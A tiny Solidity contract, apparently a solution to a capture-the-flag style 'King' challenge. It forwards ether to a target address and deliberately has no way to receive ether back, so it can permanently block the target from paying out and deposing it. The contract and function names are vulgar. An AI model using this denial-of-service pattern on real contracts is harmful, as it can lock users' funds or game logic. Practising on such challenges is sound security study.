// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

contract FuckKing {
    address kingAddress;

    constructor(address _address) {
        kingAddress = _address;
    }

    function fuck() external payable {
        (bool success, ) = kingAddress.call{value: msg.value}("");
        require(success);
    }
}
